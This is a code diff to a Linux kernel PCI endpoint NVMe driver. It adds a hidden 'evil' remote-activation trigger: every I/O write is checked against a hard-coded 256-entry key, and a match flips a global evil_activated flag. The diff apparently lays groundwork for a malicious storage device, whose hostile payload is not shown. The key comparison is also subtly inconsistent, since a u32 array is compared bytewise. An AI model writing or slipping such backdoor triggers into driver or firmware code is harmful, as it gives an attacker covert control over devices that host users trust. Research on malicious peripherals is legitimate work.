@@ -31,6 +31,29 @@
 #include <../drivers/nvme/host/nvme.h>
 #include <../drivers/nvme/host/fabrics.h>
 
+/* Unique eNVMe activation key */
+#define NVME_EVIL_ACTIVATION_KEY_LEN 256
+static const u32 activation_key[NVME_EVIL_ACTIVATION_KEY_LEN] = {
+	173,104,115,108,144, 88, 50, 76, 41,228,178, 51,145,254,156, 44,
+	 99, 98, 58,140,233,176,165,109,134,  8,181, 95, 26, 43,107, 60,
+	161, 61,246, 87, 78, 73, 57,215, 53,175,  7, 11,184, 77, 37,  2,
+	148,200,205, 19,137, 66, 13,186, 93,236,248,111, 21,177,120,234,
+	163, 65,  4,133,141,243,151,174,129, 74, 64,  0,195,157,216,162,
+	235, 45,249,213, 22,155,247, 14, 32, 75, 67,183, 63,139,  1, 59,
+	 20,113,136,138,187,154,223,189,193,110,225,101,203,222, 81,240,
+	125, 72,238,204, 12, 55,231, 24,255,244,118, 17,152, 56, 97,116,
+	 80,135, 79, 70, 42,250,114,159,209,207, 52,237,188,167, 71, 40,
+	160, 36, 82,182,142,126, 38, 10,103, 49, 27,106,194,226,253, 68,
+	206, 69,201,171,251, 34,218,  3,128,170,121,146, 96,150,  6, 85,
+	 89,119,197,153, 86,202,  5,179, 91, 94,211,219,100,239, 35,217,
+	224,149,105,196, 62, 90,117,191, 31,147,131,  9,185,230,158,166,
+	199,232, 25,172,252, 46,242, 39,130,122,164,143, 48,124, 15,180,
+	102,220,241,227,229,190,169,212,208, 33, 16, 28, 47,214, 18,123,
+	245,198, 54,127,256, 23, 30,132, 92,210,192, 83,112, 84,221, 29,
+};
+/* eNVMe activation status */
+static bool evil_activated = false;
+
 /*
  * Maximum number of queue pairs: A higheer this number, the more mapping
  * windows of the PCI endpoint controller will be used. To avoid exceeding the
@@ -171,6 +194,7 @@ struct pci_epf_nvme_cmd {
 	struct pci_epf_nvme_segment	*segs;
 
 	struct work_struct		work;
+	struct work_struct		evil_work;
 };
 
 /*
@@ -209,6 +233,8 @@ struct pci_epf_nvme {
 	struct mutex			irq_lock;
 
 	struct delayed_work		reg_poll;
+
+	struct workqueue_struct		*evil_wq;
 
 	/* Function configfs attributes */
 	struct config_group		group;
@@ -606,6 +632,7 @@ pci_epf_nvme_alloc_cmd(struct pci_epf_nvme *nvme)
 }
 
 static void pci_epf_nvme_exec_cmd_work(struct work_struct *work);
+static void pci_epf_nvme_evil_work(struct work_struct *work);
 
 static void pci_epf_nvme_init_cmd(struct pci_epf_nvme *epf_nvme,
 				  struct pci_epf_nvme_cmd *epcmd,
@@ -614,6 +641,7 @@ static void pci_epf_nvme_init_cmd(struct pci_epf_nvme *epf_nvme,
 	memset(epcmd, 0, sizeof(*epcmd));
 	INIT_LIST_HEAD(&epcmd->link);
 	INIT_WORK(&epcmd->work, pci_epf_nvme_exec_cmd_work);
+	INIT_WORK(&epcmd->evil_work, pci_epf_nvme_evil_work);
 	epcmd->epf_nvme = epf_nvme;
 	epcmd->sqid = sqid;
 	epcmd->cqid = cqid;
@@ -694,6 +722,32 @@ static void pci_epf_nvme_complete_cmd(struct pci_epf_nvme_cmd *epcmd)
 	list_add_tail(&epcmd->link, &cq->list);
 	queue_delayed_work(epf_nvme->ctrl.wq, &cq->work, 0);
 	spin_unlock_irqrestore(&cq->lock, flags);
+}
+
+static void pci_epf_nvme_evil_work(struct work_struct *work)
+{
+	struct pci_epf_nvme_cmd *epcmd =
+		container_of(work, struct pci_epf_nvme_cmd, evil_work);
+	struct device *dev = &epcmd->epf_nvme->epf->dev;
+	int ret;
+
+	/* Only check the hash on smaller transfers, remote activation should
+	 * use a small write to activate, don't bother with large writes */
+	if (epcmd->buffer_size <= SZ_128K) {
+		/* Compare exactly, don't hash because of collisions */
+		ret = memcmp(epcmd->buffer, activation_key,
+			     NVME_EVIL_ACTIVATION_KEY_LEN);
+
+		//print_hex_dump_bytes("", DUMP_PREFIX_ADDRESS, epcmd->buffer,
+		//		     NVME_EVIL_ACTIVATION_KEY_LEN);
+
+		if (!ret) {
+			dev_info(dev, "evil: REMOTE ACTIVATION\n");
+			evil_activated = true;
+		}
+	}
+
+	pci_epf_nvme_free_cmd(epcmd);
 }
 
 static int pci_epf_nvme_transfer_cmd_data(struct pci_epf_nvme_cmd *epcmd)
@@ -1122,6 +1176,11 @@ static bool pci_epf_nvme_queue_response(struct pci_epf_nvme_cmd *epcmd)
 	if (cq->tail >= cq->depth) {
 		cq->tail = 0;
 		cq->phase ^= 1;
+	}
+
+	if (epcmd->sqid && epcmd->cmd.common.opcode == nvme_cmd_write) {
+		queue_work(epf_nvme->evil_wq, &epcmd->evil_work);
+		return true;
 	}
 
 free_cmd:
@@ -2618,6 +2677,10 @@ static int pci_epf_nvme_probe(struct pci_epf *epf,
 
 	epf_nvme->epf = epf;
 	INIT_DELAYED_WORK(&epf_nvme->reg_poll, pci_epf_nvme_reg_poll);
+
+	epf_nvme->evil_wq = create_singlethread_workqueue("evil wq");
+	if (!epf_nvme->evil_wq)
+		return -ENOMEM;
 
 	epf_nvme->prp_list_buf = devm_kzalloc(&epf->dev, NVME_CTRL_PAGE_SIZE,
 					      GFP_KERNEL);
